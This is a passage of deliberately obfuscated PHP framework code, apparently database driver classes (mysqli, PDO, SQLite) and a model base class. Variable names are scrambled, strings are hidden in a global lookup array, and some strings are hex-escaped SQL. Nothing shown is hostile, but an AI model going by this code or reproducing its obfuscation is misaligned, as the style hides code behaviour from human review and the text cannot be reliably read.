$this->transTimes = 0; if (!$£ğï„¨) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ê®¨õ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ê®¨õ) { $this->error(); return !1; } } return !0; } private function getAll() { $ıÛÍÏÔ = array(); if ($this->numRows > 0) { for ($ÏÆªù˜ = 0; $ÏÆªù˜ < $this->numRows; $ÏÆªù˜++) { $ıÛÍÏÔ[$ÏÆªù˜] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ıÛÍÏÔ; } public function getFields($ì³¹Éµ³) { $å…ã™î =& $_SERVER[Ò°Ì”İ•]; $æÉ½«Ê = $this->query($å…ã™î[970] . $this->parseKey($ì³¹Éµ³)); $›ÁÒÕ¼ø = array(); if ($æÉ½«Ê) { foreach ($æÉ½«Ê as $ Ö„¼“§ => $Êû„ã™Ô) { $›ÁÒÕ¼ø[$Êû„ã™Ô[$å…ã™î[31]]] = array($å…ã™î[32] => $Êû„ã™Ô[$å…ã™î[31]], $å…ã™î[33] => $Êû„ã™Ô[$å…ã™î[34]], $å…ã™î[35] => (bool) ($Êû„ã™Ô[$å…ã™î[36]] === $å…ã™î[12]), $å…ã™î[37] => $Êû„ã™Ô[$å…ã™î[38]], $å…ã™î[39] => strtolower($Êû„ã™Ô[$å…ã™î[40]]) == $å…ã™î[41], $å…ã™î[42] => strtolower($Êû„ã™Ô[$å…ã™î[43]]) == $å…ã™î[44]); } } return $›ÁÒÕ¼ø; } public function getTables($ı£—Éûû = '') { $³ƒöÜé =& $_SERVER[Ò°Ì”İ•]; $¿„ÂµÚ‡ = !empty($ı£—Éûû) ? $³ƒöÜé[972] . $ı£—Éûû . $³ƒöÜé[973] : $³ƒöÜé[974]; $è°í¬òß = $this->query($¿„ÂµÚ‡); $ÄÊ–´Ïí = array(); if ($è°í¬òß) { foreach ($è°í¬òß as $å¨èì– => $ıä‹Íî¶) { $ÄÊ–´Ïí[$å¨èì–] = current($ıä‹Íî¶); } } return $ÄÊ–´Ïí; } public function replace($ºëí©Şæ, $ÂĞ–ªÜø = array()) { $ı‹©§¿… =& $_SERVER[Ò°Ì”İ•]; foreach ($ºëí©Şæ as $ß¤İº¯ú => $Ğ‹¯´´) { $å­¼ÛÑÚ = $this->parseValue($Ğ‹¯´´); if (is_scalar($å­¼ÛÑÚ)) { $âª‰Æ¥ü[] = $å­¼ÛÑÚ; $—”¦éÄÜ[] = $this->parseKey($ß¤İº¯ú); } } $ÉØòİ×Õ = $ı‹©§¿…[975] . $this->parseTable($ÂĞ–ªÜø[$ı‹©§¿…[368]]) . $ı‹©§¿…[976] . implode($ı‹©§¿…[50], $—”¦éÄÜ) . $ı‹©§¿…[977] . implode($ı‹©§¿…[50], $âª‰Æ¥ü) . $ı‹©§¿…[978]; return $this->execute($ÉØòİ×Õ); } public function insertAll($â¦†µóë, $åïÎÓô† = array(), $ŸµÅñ„ğ = false) { $ óÜË =& $_SERVER[Ò°Ì”İ•]; if (!is_array($â¦†µóë[0])) { return !1; } $À¯œ—²Ø = array_keys($â¦†µóë[0]); $¥ï÷á­Ğ = array(); foreach ($â¦†µóë as $çÛÁàÓ°) { $²ßôô”Ñ = array(); foreach ($çÛÁàÓ° as $ÊÙŞˆ¦Á => $•Ã²ºùé) { $•Ã²ºùé = $this->parseValue($•Ã²ºùé); if (is_scalar($•Ã²ºùé)) { $²ßôô”Ñ[] = $•Ã²ºùé; } } $¥ï÷á­Ğ[] = $ óÜË[349] . implode($ óÜË[50], $²ßôô”Ñ) . $ óÜË[978]; } array_walk($À¯œ—²Ø, array($this, $ óÜË[979])); $ ¡¿Ç›µ = $ŸµÅñ„ğ ? $ óÜË[980] : $ óÜË[981]; $ªĞÒÔ¹ê = $ ¡¿Ç›µ . $ óÜË[982] . $this->parseTable($åïÎÓô†[$ óÜË[368]]) . $ óÜË[976] . implode($ óÜË[50], $À¯œ—²Ø) . $ óÜË[983] . implode($ óÜË[50], $¥ï÷á­Ğ); return $this->execute($ªĞÒÔ¹ê); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ÿ××ëä£ =& $_SERVER[Ò°Ì”İ•]; $this->error = $this->_linkID->errno . $Ÿ××ëä£[4] . $this->_linkID->error; if ($Ÿ××ëä£[12] != $this->queryStr) { $this->error .= LNG($Ÿ××ëä£[48]) . $this->queryStr; } think_trace($this->error, $Ÿ××ëä£[12], $Ÿ××ëä£[49]); return $this->error; } public function escapeString($¥˜°ÏÒÌ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¥˜°ÏÒÌ); } else { return addslashes($¥˜°ÏÒÌ); } } public function parseKey(&$ÍÛ½¸™¾, $½é°Ò¸¿ = true) { $òÊ¼éÚß =& $_SERVER[Ò°Ì”İ•]; if ($½é°Ò¸¿) { $ÍÛ½¸™¾ = $this->parseKeyCheck($ÍÛ½¸™¾); } if ($ÍÛ½¸™¾ != $òÊ¼éÚß[233] && !preg_match($òÊ¼éÚß[984], $ÍÛ½¸™¾)) { $ÍÛ½¸™¾ = $òÊ¼éÚß[473] . trim($ÍÛ½¸™¾, $òÊ¼éÚß[473]) . $òÊ¼éÚß[473]; } return $ÍÛ½¸™¾; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($İ¨ê÷£œ = '') { $İ¡›Ä—ƒ =& $_SERVER[Ò°Ì”İ•]; if (!class_exists($İ¡›Ä—ƒ[987])) { think_exception(think_lang($İ¡›Ä—ƒ[14]) . $İ¡›Ä—ƒ[988]); } if (!empty($İ¨ê÷£œ)) { $this->config = $İ¨ê÷£œ; if (empty($this->config[$İ¡›Ä—ƒ[17]])) { $this->config[$İ¡›Ä—ƒ[17]] = array(); } } } public function connect($¡Ì·ş™Û = '', $§æÅñ•† = 0) { $µÑ«¦ ± =& $_SERVER[Ò°Ì”İ•]; if (!isset($this->linkID[$§æÅñ•†])) { if (empty($¡Ì·ş™Û)) { $¡Ì·ş™Û = $this->config; } $¦ÛÎó× = !empty($¡Ì·ş™Û[$µÑ«¦ ±[17]][$µÑ«¦ ±[18]]) ? $¡Ì·ş™Û[$µÑ«¦ ±[17]][$µÑ«¦ ±[18]] : $this->pconnect; if ($¦ÛÎó×) { $¡Ì·ş™Û[$µÑ«¦ ±[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$§æÅñ•†] = new PDO($¡Ì·ş™Û[$µÑ«¦ ±[989]], $¡Ì·ş™Û[$µÑ«¦ ±[961]], $¡Ì·ş™Û[$µÑ«¦ ±[962]], $¡Ì·ş™Û[$µÑ«¦ ±[17]]); } catch (PDOException $ĞÅ«Ğ–) { think_exception($ĞÅ«Ğ–->getMessage()); } $this->dbType = $this->_getDsnType($¡Ì·ş™Û[$µÑ«¦ ±[989]]); if (in_array($this->dbType, array($µÑ«¦ ±[990], $µÑ«¦ ±[991], $µÑ«¦ ±[992], $µÑ«¦ ±[993]))) { think_exception($µÑ«¦ ±[994] . $this->dbType . $µÑ«¦ ±[995] . $this->dbType . $µÑ«¦ ±[996]); } if (!$this->linkID[$§æÅñ•†]) { think_exception($µÑ«¦ ±[997]); } try { $this->linkID[$§æÅñ•†]->exec($µÑ«¦ ±[998] . think_config($µÑ«¦ ±[964])); } catch (Exception $ĞÅ«Ğ–) { } $this->connected = !0; if (1 != think_config($µÑ«¦ ±[22])) { unset($this->config); } } return $this->linkID[$§æÅñ•†]; } public function free() { $this->PDOStatement = null; } public function query($»ïÃŠÊÑ, $ ıåºõ = array()) { $ˆÌ¨†¹‰ =& $_SERVER[Ò°Ì”İ•]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $»ïÃŠÊÑ; if (!empty($ ıåºõ)) { $this->queryStr .= $ˆÌ¨†¹‰[999] . print_r($ ıåºõ, !0) . $ˆÌ¨†¹‰[1000]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ˆÌ¨†¹‰[23], 1); think_status($ˆÌ¨†¹‰[24]); $this->PDOStatement = $this->_linkID->prepare($»ïÃŠÊÑ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÃÓ±­Ì = $this->PDOStatement->execute($ ıåºõ); $this->debug(); if (!1 === $ÃÓ±­Ì) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¶±áäîò, $ˆ¹íì’ù = array()) { $ã‡óİÁ =& $_SERVER[Ò°Ì”İ•]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¶±áäîò; if (!empty($ˆ¹íì’ù)) { $this->queryStr .= $ã‡óİÁ[999] . print_r($ˆ¹íì’ù, !0) . $ã‡óİÁ[1000]; } $¼şÌîà = !1; if ($this->dbType == $ã‡óİÁ[993]) { if (preg_match($ã‡óİÁ[1001], $this->queryStr, $¿ê×½)) { $this->table = think_config($ã‡óİÁ[1002]) . str_ireplace(think_config($ã‡óİÁ[1003]), $ã‡óİÁ[466], $¿ê×½[2]); $¼şÌîà = (bool) $this->query($ã‡óİÁ[1004] . strtoupper($this->table) . $ã‡óİÁ[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ã‡óİÁ[25], 1); think_status($ã‡óİÁ[24]); $this->PDOStatement = $this->_linkID->prepare($¶±áäîò); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $°ÉÎå°è = $this->PDOStatement->execute($ˆ¹íì’ù); $this->debug(); if (!1 === $°ÉÎå°è) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¼şÌîà || preg_match($ã‡óİÁ[1005], $¶±áäîò)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ê¯É³ƒÊ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ê¯É³ƒÊ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $šğøÜÜÉ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$šğøÜÜÉ) { $this->error(); return !1; } } return !0; } private function getAll() { $‘““«¼µ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($‘““«¼µ); return $‘““«¼µ; } public function getFields($ßªóƒ÷ì) { $šÇ÷ø‰Ü =& $_SERVER[Ò°Ì”İ•]; $this->initConnect(!0); if (think_config($šÇ÷ø‰Ü[1006])) { $½±ç·œ¢ = str_replace($šÇ÷ø‰Ü[1007], $ßªóƒ÷ì, think_config($šÇ÷ø‰Ü[1006])); } else { switch ($this->dbType) { case $šÇ÷ø‰Ü[990]: case $šÇ÷ø‰Ü[1008]: $½±ç·œ¢ = "\x53\105\x4c\105\x43\124\x20\x20\x20\x63\x6f\x6c\x75\x6d\156\x5f\x6e\x61\155\x65\x20\x61\x73\x20\47\x4e\x61\155\145\x27\54\40\40\x20\144\x61\x74\x61\x5f\x74\171\x70\x65\x20\141\x73\x20\47\124\171\x70\145\x27\54\40\x20\40\143\x6f\154\x75\155\156\137\x64\145\x66\141\x75\x6c\x74\x20\141\x73\40\x27\x44\x65\x66\141\x75\x6c\164\x27\54\x20\40\40\151\x73\x5f\156\165\154\154\141\142\154\145\40\x61\x73\40\x27\116\165\x6c\x6c\x27\12\11\11\106\122\x4f\x4d\x9\x69\156\x66\157\162\155\141\164\x69\x6f\x6e\137\x73\143\150\145\x6d\x61\56\x74\141\142\154\145\x73\x20\101\x53\40\x74\xa\x9\11\x4a\x4f\111\x4e\11\x69\x6e\x66\x6f\x72\155\141\x74\x69\x6f\156\x5f\x73\x63\150\145\x6d\141\56\x63\x6f\x6c\165\155\156\163\40\x41\123\x20\x63\12\x9\11\x4f\116\x20\x20\x74\x2e\x74\x61\142\x6c\x65\x5f\143\141\164\141\154\x6f\147\40\x3d\40\143\x2e\164\141\142\154\145\x5f\143\141\164\141\154\157\147\xa\11\11\101\x4e\104\x20\x74\56\x74\141\142\x6c\x65\137\163\143\x68\x65\x6d\141\x20\x3d\40\x63\56\x74\141\142\154\145\137\163\143\x68\x65\155\x61\xa\11\11\101\116\x44\40\164\56\x74\141\142\x6c\x65\x5f\156\141\155\x65\x20\x3d\x20\x63\x2e\x74\x61\142\x6c\x65\137\156\141\155\145\12\11\11\x57\110\105\122\x45\x20\40\x20\164\x2e\x74\x61\142\154\145\137\156\x61\155\x65\40\x3d\x20\x27{$ßªóƒ÷ì}\x27"; break; case $šÇ÷ø‰Ü[1009]: $½±ç·œ¢ = $šÇ÷ø‰Ü[1010] . $ßªóƒ÷ì . $šÇ÷ø‰Ü[1011]; break; case $šÇ÷ø‰Ü[991]: case $šÇ÷ø‰Ü[993]: $½±ç·œ¢ = $šÇ÷ø‰Ü[1012] . $šÇ÷ø‰Ü[1013] . $šÇ÷ø‰Ü[1014] . strtoupper($ßªóƒ÷ì) . $šÇ÷ø‰Ü[1015] . strtoupper($ßªóƒ÷ì) . $šÇ÷ø‰Ü[1016]; break; case $šÇ÷ø‰Ü[1017]: $½±ç·œ¢ = $šÇ÷ø‰Ü[1018] . $ßªóƒ÷ì . $šÇ÷ø‰Ü[1019]; break; case $šÇ÷ø‰Ü[992]: break; case $šÇ÷ø‰Ü[1020]: default: $½±ç·œ¢ = $šÇ÷ø‰Ü[1021] . ($this->dbType == $šÇ÷ø‰Ü[1020] ? "\x60{$ßªóƒ÷ì}\140" : $ßªóƒ÷ì); } } $ëŸğÍıÒ = $this->query($½±ç·œ¢); $¨¾é¼Ò = array(); if ($ëŸğÍıÒ) { foreach ($ëŸğÍıÒ as $˜ÕÚé”ï => $òü¸±¥) { $òü¸±¥ = array_change_key_case($òü¸±¥); $òü¸±¥[$šÇ÷ø‰Ü[32]] = isset($òü¸±¥[$šÇ÷ø‰Ü[32]]) ? $òü¸±¥[$šÇ÷ø‰Ü[32]] : $šÇ÷ø‰Ü[466]; $òü¸±¥[$šÇ÷ø‰Ü[33]] = isset($òü¸±¥[$šÇ÷ø‰Ü[33]]) ? $òü¸±¥[$šÇ÷ø‰Ü[33]] : $šÇ÷ø‰Ü[466]; $İÒ¸Üœù = isset($òü¸±¥[$šÇ÷ø‰Ü[362]]) ? $òü¸±¥[$šÇ÷ø‰Ü[362]] : $òü¸±¥[$šÇ÷ø‰Ü[32]]; $¨¾é¼Ò[$İÒ¸Üœù] = array($šÇ÷ø‰Ü[32] => $İÒ¸Üœù, $šÇ÷ø‰Ü[33] => $òü¸±¥[$šÇ÷ø‰Ü[33]], $šÇ÷ø‰Ü[35] => (bool) (isset($òü¸±¥[$šÇ÷ø‰Ü[117]]) && $òü¸±¥[$šÇ÷ø‰Ü[117]] === $šÇ÷ø‰Ü[12] || isset($òü¸±¥[$šÇ÷ø‰Ü[35]]) && $òü¸±¥[$šÇ÷ø‰Ü[35]] === $šÇ÷ø‰Ü[12]), $šÇ÷ø‰Ü[37] => isset($òü¸±¥[$šÇ÷ø‰Ü[37]]) ? $òü¸±¥[$šÇ÷ø‰Ü[37]] : (isset($òü¸±¥[$šÇ÷ø‰Ü[66]]) ? $òü¸±¥[$šÇ÷ø‰Ü[66]] : $šÇ÷ø‰Ü[466]), $šÇ÷ø‰Ü[39] => isset($òü¸±¥[$šÇ÷ø‰Ü[108]]) ? strtolower($òü¸±¥[$šÇ÷ø‰Ü[108]]) == $šÇ÷ø‰Ü[41] : (isset($òü¸±¥[$šÇ÷ø‰Ü[67]]) ? $òü¸±¥[$šÇ÷ø‰Ü[67]] : !1), $šÇ÷ø‰Ü[42] => isset($òü¸±¥[$šÇ÷ø‰Ü[1022]]) ? strtolower($òü¸±¥[$šÇ÷ø‰Ü[1022]]) == $šÇ÷ø‰Ü[44] : (isset($òü¸±¥[$šÇ÷ø‰Ü[108]]) ? $òü¸±¥[$šÇ÷ø‰Ü[108]] : !1)); } } return $¨¾é¼Ò; } public function getTables($Â´åù¾İ = '') { $Ì’›ˆˆ¥ =& $_SERVER[Ò°Ì”İ•]; if (think_config($Ì’›ˆˆ¥[1023])) { $ËıµÙ‘ğ = str_replace($Ì’›ˆˆ¥[1024], $Â´åù¾İ, think_config($Ì’›ˆˆ¥[1023])); } else { switch ($this->dbType) { case $Ì’›ˆˆ¥[991]: case $Ì’›ˆˆ¥[993]: $ËıµÙ‘ğ = $Ì’›ˆˆ¥[1025]; break; case $Ì’›ˆˆ¥[990]: case $Ì’›ˆˆ¥[1008]: $ËıµÙ‘ğ = $Ì’›ˆˆ¥[1026]; break; case $Ì’›ˆˆ¥[1017]: $ËıµÙ‘ğ = $Ì’›ˆˆ¥[1027]; break; case $Ì’›ˆˆ¥[992]: think_exception(think_lang($Ì’›ˆˆ¥[1028]) . $Ì’›ˆˆ¥[1029]); break; case $Ì’›ˆˆ¥[1009]: $ËıµÙ‘ğ = $Ì’›ˆˆ¥[45] . $Ì’›ˆˆ¥[46] . $Ì’›ˆˆ¥[47]; break; case $Ì’›ˆˆ¥[1020]: default: if (!empty($Â´åù¾İ)) { $ËıµÙ‘ğ = $Ì’›ˆˆ¥[972] . $Â´åù¾İ . $Ì’›ˆˆ¥[973]; } else { $ËıµÙ‘ğ = $Ì’›ˆˆ¥[974]; } } } $èÃ÷¡Ç· = $this->query($ËıµÙ‘ğ); $åØî­† = array(); foreach ($èÃ÷¡Ç· as $£õ¦£¸¬ => $Â˜âÀ) { $åØî­†[$£õ¦£¸¬] = current($Â˜âÀ); } return $åØî­†; } protected function parseLimit($‚·ÕÃÈ) { $Æõ²‡•– =& $_SERVER[Ò°Ì”İ•]; $×ˆÎ¸‹î = $Æõ²‡•–[12]; if (!empty($‚·ÕÃÈ)) { switch ($this->dbType) { case $Æõ²‡•–[1017]: case $Æõ²‡•–[1009]: $‚·ÕÃÈ = explode($Æõ²‡•–[50], $‚·ÕÃÈ); if (count($‚·ÕÃÈ) > 1) { $×ˆÎ¸‹î .= $Æõ²‡•–[51] . $‚·ÕÃÈ[1] . $Æõ²‡•–[52] . $‚·ÕÃÈ[0] . $Æõ²‡•–[53]; } else { $×ˆÎ¸‹î .= $Æõ²‡•–[51] . $‚·ÕÃÈ[0] . $Æõ²‡•–[53]; } break; case $Æõ²‡•–[990]: case $Æõ²‡•–[1008]: break; case $Æõ²‡•–[992]: break; case $Æõ²‡•–[991]: case $Æõ²‡•–[993]: break; case $Æõ²‡•–[1020]: default: $×ˆÎ¸‹î .= $Æõ²‡•–[51] . $‚·ÕÃÈ . $Æõ²‡•–[53]; } } return $×ˆÎ¸‹î; } public function parseKey(&$»Øç˜˜¼, $’ş£æäø = true) { $¨ó±œÃ‚ =& $_SERVER[Ò°Ì”İ•]; if ($’ş£æäø) { $»Øç˜˜¼ = $this->parseKeyCheck($»Øç˜˜¼); } if ($this->dbType == $¨ó±œÃ‚[1020]) { if ($»Øç˜˜¼ != $¨ó±œÃ‚[233] && !preg_match($¨ó±œÃ‚[984], $»Øç˜˜¼)) { $»Øç˜˜¼ = $¨ó±œÃ‚[473] . trim($»Øç˜˜¼, $¨ó±œÃ‚[473]) . $¨ó±œÃ‚[473]; } return $»Øç˜˜¼; } else { return parent::parseKey($»Øç˜˜¼, $’ş£æäø); } } public function close() { $this->_linkID = null; } public function error() { $œÊÉø”¤ =& $_SERVER[Ò°Ì”İ•]; if ($this->PDOStatement) { $ïÉ¡Æ­– = $this->PDOStatement->errorInfo(); $this->error = $ïÉ¡Æ­–[1] . $œÊÉø”¤[4] . $ïÉ¡Æ­–[2]; } else { $this->error = $œÊÉø”¤[12]; } if ($œÊÉø”¤[12] != $this->queryStr) { $this->error .= LNG($œÊÉø”¤[48]) . $this->queryStr; } think_trace($this->error, $œÊÉø”¤[12], $œÊÉø”¤[49]); return $this->error; } public function escapeString($ÕÉ‚ºÉş) { $‘ºĞşÆ =& $_SERVER[Ò°Ì”İ•]; switch ($this->dbType) { case $‘ºĞşÆ[1017]: case $‘ºĞşÆ[990]: case $‘ºĞşÆ[1008]: case $‘ºĞşÆ[1020]: return addslashes($ÕÉ‚ºÉş); case $‘ºĞşÆ[992]: case $‘ºĞşÆ[1009]: case $‘ºĞşÆ[991]: case $‘ºĞşÆ[993]: return str_ireplace($‘ºĞşÆ[68], $‘ºĞşÆ[69], $ÕÉ‚ºÉş); } } protected function parseValue($Úï‡ÈÅæ) { $Ğ¡»¹Ù =& $_SERVER[Ò°Ì”İ•]; if (is_string($Úï‡ÈÅæ)) { $™éÎå÷² = strpos($Úï‡ÈÅæ, $Ğ¡»¹Ù[4]) === 0 && in_array($Úï‡ÈÅæ, array_keys($this->bind)); $Úï‡ÈÅæ = $™éÎå÷² ? $this->escapeString($Úï‡ÈÅæ) : $Ğ¡»¹Ù[1030] . $this->escapeString($Úï‡ÈÅæ) . $Ğ¡»¹Ù[1030]; } elseif (isset($Úï‡ÈÅæ[0]) && is_string($Úï‡ÈÅæ[0]) && strtolower($Úï‡ÈÅæ[0]) == $Ğ¡»¹Ù[384]) { $Úï‡ÈÅæ = $this->escapeString($Úï‡ÈÅæ[1]); } elseif (is_array($Úï‡ÈÅæ)) { $Úï‡ÈÅæ = array_map(array($this, $Ğ¡»¹Ù[1031]), $Úï‡ÈÅæ); } elseif (is_bool($Úï‡ÈÅæ)) { $Úï‡ÈÅæ = $Úï‡ÈÅæ ? $Ğ¡»¹Ù[102] : $Ğ¡»¹Ù[241]; } elseif (is_null($Úï‡ÈÅæ)) { $Úï‡ÈÅæ = $Ğ¡»¹Ù[117]; } return $Úï‡ÈÅæ; } public function getLastInsertId() { $Ÿæ¡Ÿ•é =& $_SERVER[Ò°Ì”İ•]; switch ($this->dbType) { case $Ÿæ¡Ÿ•é[1017]: case $Ÿæ¡Ÿ•é[1009]: case $Ÿæ¡Ÿ•é[990]: case $Ÿæ¡Ÿ•é[1008]: case $Ÿæ¡Ÿ•é[992]: case $Ÿæ¡Ÿ•é[1020]: return $this->_linkID->lastInsertId(); case $Ÿæ¡Ÿ•é[991]: case $Ÿæ¡Ÿ•é[993]: $¿õ¦Ø = $this->table; $®ÖÀŸğé = $this->query("\123\x45\114\105\103\124\x20{$¿õ¦Ø}\x2e\143\x75\162\x72\166\x61\x6c\x20\143\x75\x72\x72\166\x61\154\x20\106\x52\117\115\40\x64\165\141\154"); return $®ÖÀŸğé ? $®ÖÀŸğé[0][$Ÿæ¡Ÿ•é[1032]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Æäª„ı½) { $Üï”â· =& $_SERVER[Ò°Ì”İ•]; if (!CacheLock::fileLock($Üï”â·[13])) { return !1; } $†îĞÓÓÔ = parent::query($Æäª„ı½); CacheLock::fileUnLock($Üï”â·[13]); return $†îĞÓÓÔ; } public function execute($Ş‰—ßğÛ) { $¾¾½¸— =& $_SERVER[Ò°Ì”İ•]; if (!CacheLock::fileLock($¾¾½¸—[13])) { return !1; } $Ù›ÓÀçÁ = parent::execute($Ş‰—ßğÛ); CacheLock::fileUnLock($¾¾½¸—[13]); return $Ù›ÓÀçÁ; } } goto E¨‡æ®è¿¤; A”Õ¼Ô·–Á: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\x66\x79\x54\x69\x6d\x65", "\164\151\155\x65", "\151\x6e\163\x65\162\164\54\165\160\x64\x61\x74\145", "\146\x75\156\143\x74\x69\157\156"), array("\143\162\x65\x61\164\145\x54\x69\x6d\x65", "\x74\x69\155\145", "\151\156\x73\145\x72\x74", "\146\165\x6e\143\164\x69\x6f\156")); public function setDataAuto($øµ”“Ğñ) { $this->dataAuto = $øµ”“Ğñ; } public function __construct($’ã ¦š« = '', $•ò‡´ùß = '', $å…ßô = '') { parent::__construct($’ã ¦š«, $•ò‡´ùß, $å…ßô); } protected $tableMeta = array(); protected function _beforeInsert(&$Õ§Á²êÉ, $‚ºÀÏ§£) { $ŸîÅÀ¼Ú =& $_SERVER[Ò°Ì”İ•]; if (!$this->checkDataAutoHas($ŸîÅÀ¼Ú[442])) { return; } $this->dataBeforeFilter($Õ§Á²êÉ, $ŸîÅÀ¼Ú[442]); } protected function _beforeUpdate(&$ àÄ±–€, $¶Ô¼ƒ) { $»Ÿä€¸Ğ =& $_SERVER[Ò°Ì”İ•]; if (!$this->checkDataAutoHas($»Ÿä€¸Ğ[443])) { return; } $this->dataBeforeFilter($ àÄ±–€, $»Ÿä€¸Ğ[443]); } protected function _afterSelect(&$ÜÍÅÎ¬õ, $òĞƒ›) { if (!is_array($ÜÍÅÎ¬õ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ò°Ì”İ•][444])) { return; } foreach ($ÜÍÅÎ¬õ as &$óÊÓ¯ Ë) { $this->dataAfterFilter($óÊÓ¯ Ë); } unset($óÊÓ¯ Ë); } protected function _afterFind(&$îÚ¦©â, $ñ£É¸³×) { if (!is_array($îÚ¦©â)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ò°Ì”İ•][444])) { return; } $this->dataAfterFilter($îÚ¦©â); } public static function textEncode($úÑË‹ûñ) { if (!$úÑË‹ûñ) { return $úÑË‹ûñ; } $ú¦º®û¿ = json_encode($úÑË‹ûñ); $ú¦º®û¿ = preg_replace_callback($_SERVER[Ò°Ì”İ•][445], function ($ğÌ¸ÊÏ‚) { return addslashes($ğÌ¸ÊÏ‚[0]); }, $ú¦º®û¿); return json_decode($ú¦º®û¿); } public static function textDecode($–·¥¬§) { $¿ÇË×ÖÀ =& $_SERVER[Ò°Ì”İ•]; $Ğø‹ñˆ¸ = json_encode($–·¥¬§); $Ğø‹ñˆ¸ = preg_replace_callback($¿ÇË×ÖÀ[446], function ($·Î¿úÑ¹) { return $_SERVER[Ò°Ì”İ•][111]; }, $Ğø‹ñˆ¸); return json_decode($Ğø‹ñˆ¸); } public function setAutoIncrement($–ıœÂ•ö) { $¾èğö¥ = array($this->getPk() => $–ıœÂ•ö); $ä¥û²ğ¾ = $this->data($¾èğö¥)->add(); if ($ä¥û²ğ¾) { $this->delete($ä¥û²ğ¾); } } public function getAutoIncrement() { $Í½Ã¡–â = $this->getTableName(); $Ïİ¨ëÁ¶ = $this->max($this->getPk()); $ã½œˆ½± = $this->query("\163\150\x6f\x77\40\x74\x61\142\154\x65\40\x73\164\141\x74\x75\163\x20\167\x68\x65\x72\x65\40\116\141\155\x65\x3d\x27{$Í½Ã¡–â}\47"); $±–À™çĞ = $ã½œˆ½±[0][$_SERVER[Ò°Ì”İ•][447]]; $ÉØÒÆËå = max($Ïİ¨ëÁ¶, $±–À™çĞ); return $ÉØÒÆËå; } protected function _callBefore($óÆÏ ³¯, $¶¹åòº) { return $this->cacheCallCheck($óÆÏ ³¯, $¶¹åòº, !1); } protected function _callAfter($Ïä’Æ¡, $¸±«Î˜Õ) { return $this->cacheCallCheck($Ïä’Æ¡, $¸±«Î˜Õ, !0); } protected function cacheFunctionAlias($˜ôä…¨) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($áéä÷üï, $õŠø–ëà, $¤¼¨ñ  = false) { $ÊÅà¼–É =& $_SERVER[Ò°Ì”İ•]; $ŞƒÁÒíÑ = $this->cacheFunctionAlias($õŠø–ëà); if (!$ŞƒÁÒíÑ) { return; } foreach ($ŞƒÁÒíÑ as $¶š Ùµã => $æ»¿–€ª) { $‡Í„óÖ­ = $æ»¿–€ª[0]; $òì®¿Ÿì = explode($ÊÅà¼–É[50], $æ»¿–€ª[1]); $—–úèÍÆ = isset($æ»¿–€ª[2]) ? $æ»¿–€ª[2] : $ÊÅà¼–É[12]; if ($áéä÷üï == $¶š Ùµã) { return $this->cacheFunctionGet($¶š Ùµã, $‡Í„óÖ­, $—–úèÍÆ); } if ($¤¼¨ñ  && in_array($áéä÷üï, $òì®¿Ÿì)) { $this->cacheFunctionClear($¶š Ùµã, $‡Í„óÖ­, $—–úèÍÆ); } } } public function cacheFunctionGet($ÙºòÍ‰è, $åàÌá¾Î, $ıÀ§…á˜ = '') { $ì…í¦ÊÉ = $this->cacheKeyMake($ÙºòÍ‰è, $åàÌá¾Î, $ıÀ§…á˜); $‰¬–Ïî = Cache::get($ì…í¦ÊÉ); if (!is_array($‰¬–Ïî)) { $‰¬–Ïî = call_user_func_array(array($this, $ÙºòÍ‰è), array($åàÌá¾Î, !0)); Cache::set($ì…í¦ÊÉ, $‰¬–Ïî); } return $‰¬–Ïî; } public function cacheFunctionClear($íˆó«æµ, $ú©Äô„, $¨ä³õÃ = '') { $Ú“¨ĞÌÌ = $ú©Äô„; if (!is_array($ú©Äô„)) { $Ú“¨ĞÌÌ = array($ú©Äô„); } foreach ($Ú“¨ĞÌÌ as $¥‘ÙŸîŸ) { $¯¤Ëå¥ô = $this->cacheKeyMake($íˆó«æµ, $¥‘ÙŸîŸ, $¨ä³õÃ); Cache::remove($¯¤Ëå¥ô); } } private function cacheKeyMake($ÍùÍÂèœ, $íÅª¢æ¥, $ª§€Ì´å) { $©µ¯›Ñ¿ =& $_SERVER[Ò°Ì”İ•]; if ($ª§€Ì´å) { $íÅª¢æ¥ = $íÅª¢æ¥ . $©µ¯›Ñ¿[448] . $ª§€Ì´å; } return get_class($this) . $©µ¯›Ñ¿[11] . $ÍùÍÂèœ . $©µ¯›Ñ¿[449] . $íÅª¢æ¥; } protected function selectPageReset() { $çù§ñÒş =& $_SERVER[Ò°Ì”İ•]; if (isset($GLOBALS[$çù§ñÒş[450]])) { return; } $GLOBALS[$çù§ñÒş[450]] = isset($GLOBALS[$çù§ñÒş[7]][$çù§ñÒş[451]]) ? $GLOBALS[$çù§ñÒş[7]][$çù§ñÒş[451]] : !1; $GLOBALS[$çù§ñÒş[452]] = isset($GLOBALS[$çù§ñÒş[7]][$çù§ñÒş[440]]) ? 